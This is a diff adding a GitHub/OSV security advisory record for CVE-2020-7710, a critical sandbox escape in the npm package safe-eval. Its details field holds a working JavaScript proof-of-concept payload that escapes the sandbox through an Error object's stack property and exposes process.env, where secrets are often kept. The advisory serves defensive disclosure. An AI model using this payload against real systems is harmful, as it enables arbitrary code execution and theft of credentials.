@@ -1,0 +1,69 @@
+{
+  "id": "GHSA-hrpq-r399-whgw",
+  "summary": "Sandbox Breakout / Arbitrary Code Execution in safe-eval",
+  "details": "All versions of `safe-eval` are vulnerable to Sandbox Escape leading to Remote Code Execution. The package fails to restrict access to the main context through Error objects. This may allow attackers to execute arbitrary code in the system. \n\nEvaluating the payload \n```js\n(function (){\n  var ex = new Error\n  ex.__proto__ = null\n  ex.stack = {\n    match: x => {\n      return x.constructor.constructor(\"throw process.env\")()\n    }\n  }\n  return ex\n})()\n``` \n\nprints the contents of `process.env`.\n\n\n## Recommendation\n\nNo fix is currently available. Consider using an alternative package until a fix is made available.",
+  "aliases": [
+    "CVE-2020-7710"
+  ],
+  "modified": "2023-11-08T04:04:06.168807Z",
+  "published": "2020-08-25T23:40:53Z",
+  "database_specific": {
+    "nvd_published_at": "2020-08-21T10:15:00Z",
+    "cwe_ids": [
+      "CWE-94"
+    ],
+    "severity": "CRITICAL",
+    "github_reviewed": true,
+    "github_reviewed_at": "2020-08-25T21:20:22Z"
+  },
+  "references": [
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-7710"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/hacksparrow/safe-eval/issues/19"
+    },
+    {
+      "type": "WEB",
+      "url": "https://snyk.io/vuln/SNYK-JS-SAFEEVAL-608076"
+    },
+    {
+      "type": "WEB",
+      "url": "https://www.npmjs.com/advisories/1322"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "name": "safe-eval",
+        "ecosystem": "npm",
+        "purl": "pkg:npm/safe-eval"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "last_affected": "0.4.1"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2020/08/GHSA-hrpq-r399-whgw/GHSA-hrpq-r399-whgw.json"
+      }
+    }
+  ],
+  "schema_version": "1.6.0",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+    }
+  ]
+}
